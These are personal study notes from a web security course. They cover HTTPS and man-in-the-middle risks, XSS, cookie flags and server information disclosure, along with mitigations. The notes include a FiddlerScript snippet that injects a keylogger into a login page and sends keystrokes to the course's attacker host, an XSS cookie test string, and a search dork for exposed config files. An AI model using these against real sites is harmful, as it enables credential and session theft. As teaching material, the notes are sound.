------------------------------------
Introduction
------------------------------------

Websites for course:

	- http://attacker.hackyourselffirst.troyhunt.com/
	- http://hackyourselffirst.troyhunt.com/

Chrome developper tool vs fiddler:
	- Fiddler behave like a HTTP proxy (sits between browser and the website)

Burp like inspector (inspector 21 add-on for fiddler 2)

------------------------------------
Transport Layer Protection
------------------------------------

Transport Layer Protection (HTTPS, SSL, etc.)
	- This is related to the man in the middle attack

	- 3 objectives:
		- Authenticity: Connecting to who? Garanty of identity?
		- Integrity: Request haven't been manipulated? Response haven't been manipulated?
		- Confidentiality: Eaves dropping? (Kept private?)

Man in the middle
	- Observe/modify a communication

Persisting authentification state via cookies
	- HTTP is state less
	- Auth cookie (Authentication cookie)
		- Is in the response of the authentication from the server
		- All subsequent requests (any requests) from the client includes the auth cookie so that the server always know who the requestor is.

Auth cookie via unsecure connection
	- If an attacker can intercept the auth cookie on unsecure request, it can reproduce any requests and receive a valid response (and therefor to be logged in)
	- It only takes one request so that the auth cookie is vulnarable and the attacker could highjack the session

Loading login forms over HTTP
	A login:
		- <insecure>(Request login in HTTP -> Login response in HTTP) -> <secure>(After that credentials are posted in HTTPS -> Response in HTTPS)
	- So, we atteck the form itself instead of the POST request (which is encrypted)

	In the OnBeforeResponse method in the FiddlerScript tab:

        if(oSession.HostnameIs("http://hackyourselffirst.troyhunt.com") && oSession.PathAndQuery == "/Account/Login") {
            // Remove any compression or chunking
            oSession.utilDecodeResponse();
            
            var oBody = System.Text.Encoding.UTF8.GetString(oSession.requestBodyBytes);

            // Inject the keylogger into the page
            oBody = oBody.Replace("</body>", "<script type=\"text/javascript\" src=\"http://attacker.hackyourselffirst.troyhunt.com/Scripts/keylogger.js\"></script><script type=\"text/javascript\">destination='http://attacker.hackyourselffirst.troyhunt.com/Keylogger/?k=';</script></body>");

            oSession.utilSetResponseBody(oBody);
        }

    	- An attacker can do that at any time on an unsecure connection
    	- Over HTTPS, an attacker can't modify the loggin page

Exploiting mixed-mode content: Loading a secure page
	All assets must be loaded securely to have the site secure
	For example: An HTTP ajax call in an HTTPS website.
		- To apply the correct scheme, : <script src="//ajax.googleapis/com[..]">
			- Automatically switch to secure/unsecure depending of the context

HSTS header (HTTP Strict Transport Security)(This a mititgation to have only HTTPS request)
	- It forces request from the browser to only be made over secure connection under specified circusmtences
	- For example: http://hackyourselffirst.troyhunt.com/Content/site.css contains the AuthCookie ...
		Response can contain Strict-Transport-Security: max-age=1440 (in minutes). This means that chrome cannot emit HTTP request to this site for the next day. If we do, it will be converted into a HTTPS request.

Summary
	- SSL is more than just encryption (the 3 objectives above)
	- Many points to do a man in the middle
	- If you need SSL, you also need to use it correctly (no sensitive cookies over HTTP, don't use HTTP to load the forms, do not embed insecure content in secure page (mixed content))
	- HSTS additional safety net

------------------------------------
Cross Site Scripting (XSS)
------------------------------------

Introduction
	- Untrusted data and sanitisation
	- Sanitisation practices
	- What is XSS?

Understanding untrusted data and sanitisation
	- What constitutes untrusted data? : 
		Integrity not verifiable, intent may be malicious (SQL injection, XSS, binary with malware, etc.)
	- Can come from the user (from a form, in the url, etc.)
	- Can come from the browser (cookies, request headers)
	- Can come from an external web service, our own DB (if you accepted untrusted data), etc.

The use of input sanitisation
	- Filter for what is acceptable or not
		- Like rejecting <>'/"\, etc.
			- This is blacklisting the characters. Rudementry, has holes
			- This is what we don't want today, can change over time
		- The whitelist is lower risk approach and is very explicit (can use regex for example)
	- Example, some website sanitized only on < since "without it, the nthis is not HTML tag"
		- This is why blacklisting is difficult and risky

Understanding reflected untrusted data
	- Typical request with untrusted data:
		- user request resource with untrusted data -> server response the data is reflected in the response (like the search in the demo: you searched for: '[...]'). It is how you can identify an XSS risk
	- For the site:
		- Request: <trusted>(www.mysite.com/Search?q=)<untrusted>(ferrari)
		- Response: <trusted>(you searched for <strong>)<untrusted>(ferrari)<trusted>(</strong>)

		Example:
			http://hackyourselffirst.troyhunt.com/Search?searchTerm=ferrari<i>enzo</i>
			you searched for <strong><i>ferrari</i></strong>
	- Then can inject different text, or even JS (executable stuff)

Output encoding concepts
	- An other protection against XSS, other than sanitization, is to display the reflecting data exactly as it was given by the user on the screen rather then reflected in the markup (the url)
	- Output encoding context can change the encoding
		For example, for <: HTML: &lt;
							CSS: \<
							JS: \x3ci\x3
							...
    - WHAT YOU SEE IN THE DEV TOOL IS MORE REPRESENTATIVE THEN WHAT IS REPRESENTED IN THE DOM
    	 For example in the site: / in a search term is in fact &#47; in the dev tool source code, html source is a better representation of what is returned by the server

We looked at reflected XSS, another is persistent XSS
	It is what is already in the DB
		For example, it has been saved by a user, and when loaded it does bad things

X-XSS-Protection header
	- Browser embeded protection against XSS
	- As a developper, you cannot rely on that. That is a bonus.
	- For example: in the response header: X-XSS-Protection:0 (value 0 means disable)
		- X means it is a non http standard header
	- Why to disable this? Their where cases where X-XSS could cause problems to some applications

Summary
	- Sanitization is first line of defence against XSS (holes can be easy to find, espacially with blacklisting)
	- Ouput encoding is critical for mitigating the risk of XSS
	- Don't trust your own data (often-overlooked threat)
	- Browser defences is additional, don't rely on it

------------------------------------
Cookies
------------------------------------

Cookies 101
	There are just a piece of text stored in the browser

	The server can set cookies via HTTP response header or can be setted via JS directly in the DOM
	Cookies are automatically passed back to the website in the header of each request
		GET http://site.com/ HTTP/1.1
		Cookie: name=value

	HTTP cookie exchange:
		request -> ser respond with set-cookie header -> subsequent requests automatically send the cookie

Cookie security:
		- Cookies frequently contain data of a sensitive nature
		- Browsers have some native defenses for cookie (same domain), but does not protect against XSS to have cookies
		- Can be more secured by tuning their attributes

	Cookie attributes
		Domain
		Path
		Expiration
		HttpOnly
		Secure

	If AuthCookie not flaged as HTTP, then it is accessible by client script. (Risk of session highjack)

	For example: seach term on unsecure website: ');alert(document.cookie);//

	This flag is set in the response header (HttpOnly)

	This is an easy mitigation that is quite easy to add a gives a good security protection (should still sanitize though)

Understanding secure cookies
	Flag cookies as secure:
		The AuthCookie won't be visible over HTTP (for example, when you get an image). The secure flag makes the browser do not send the AuthCookie over HTTP.

		But that mean you can never make a HTTP authentification.

	For AuthCookie, we want HTTP flag for no access by client and secure flag for HTTPS only.

Restricting cookie access by path.
	In Chrome dev. tool, you can see the Path on which the cookies will be sent (Resources -> Cookies -> Path). If path is / , then they will be sent we every request (images, page, etc.) even if they don't need them.

	On log off, the Password and the Email cookies are not cleared, for automatic log in.

	If a string end by a =, it is a sign that it is probably encoded in base64. (There is base64 decoding, so this is not cryptography persay)

Reducing risk with cookie expiration
	XSS, clickjack attacks, CSRF, etc, can take place when the cookies are active.

	Need to find the right balance between convinience and security

	In dev. tool. you can see the expiration date of cookies.

Using session cookies to further reduce risk
	The AuthCookie expiration can be set to session. It will be a session cookie, therefore, when the browser closes, the cookie is discarded (ex: Banking)

	There is always a trade between usability and security.

Summary
	- 3rd party lib are often in HTTP
	- HttpOnly is an essential flag for a cookie that is not nescessary via client script

------------------------------------
Internal Implementation Disclosure
------------------------------------

How an attaker builds a website risk profile
	In other words, how do they find security flaws?
		ex: What are the points of untrusted data entry?
			What sanitisation practices have been emplyed?
			What frameworks and plugins are used?
			What is the structure of the website?
			Is there something disclosed in the source code?

	NIST: National Institute of Standards and Technology
		List all known vulnerabilities
			Made to help the dev. to protect their product, but it can also helps the attackers

Server response header disclosure
	Type of server (ex: IIS/8.0)
	AspNet-Version
	AspNetMvc-Version
	X-Powered-By: (ex: ASP.NET)

	We want to get rid of this. there is no value for the end user, and the browser do not care. That way, the attacker would have to do more reshearch.

	If you want it, you can put it in a cookie, and the value crypted

Locating at-risk websites
	Look at the Apache Release History

	CVE: Common Vulnerabilities and Exposures

	https://www.shodan.io/ : search engine look for devices

HTTP fingerprinting of servers
	It is to be able to identify specific attributes of a website to know attributes of a website

	For example:
		In fiddler: composer -> to execute requests

	You can check the order of the attributes : in Apache 1.3.23 you see date first, in IIS/8.0 you see it last. So you can guest like that.

	If you change the HTTP version for an invalid one (ex: HTTP X.1) and see what happens:
		The 400 page that comes from the server is different between Apache 1.2.23 and IIS.8.0

	Turn off HTTP headers that disclose internal implementations
		Attacker won't find you on a search engine, but if he is determine, he can find a way to guest them

Disclosure via robots.txt
	It implements the robot exlusion (exclusion for crawlers, content that they should not index)

	Attackers would start probing on those paths

	Robots.txt can be seen by anyone.

The risks of leaking data in HTML source
	Comments (psw, zipfile download path, etc.), JS libraries (versions)

Internal error message leakage
	Ex: DB could not be contacted, data conversion did not work

	This can disclose the internal representaion of the code

		ex: https://hackyourselffirst.troyhunt.com/Make/200 does not exists, so we have a Yellow screen of death (ASP.NET) We can see code, name of the error, the stacktrace, the location of the source file (location of the server), version information, etc.

	So we have to properly handle unproper requests. (Have a fiendly error message, no error internal implementation disclosure)
		But be carefull to not leak any thing in the error url (error handling url ex: [...]Error?aspxerrorpath=/Make/200)

		Do not change the url

	Keep information away from attackers..

Lack of access controls on diagnostic data
	Not enough control on sensitive implementation data (logs, etc.)

	elmah -> error login module and handlers (popular logger for ASP)
		That can give cookies (AuthCookie.. ) and multiple server attributes

	There is the name of the website and the name of the server

	Best case: Just don't make the log accessible by the public website, send them somewhere else. Or at least do not expose it publicly, ask for special account at the very least

	filetype:config inurl:web.config inurl:ftp find web.config that are acessible over ftp

	Be careful of what data is public and what should be acessible only by the admin

Summary
	Keep information about frameworks and server versions private
		But don't rely on that
	Be conscious of what you are disclosing
	Internal exceptions should never bubble up to the user
	Internal logs must have proper acces controls (this can be catastrophic)

------------------------------------
Parameter Tampering
------------------------------------

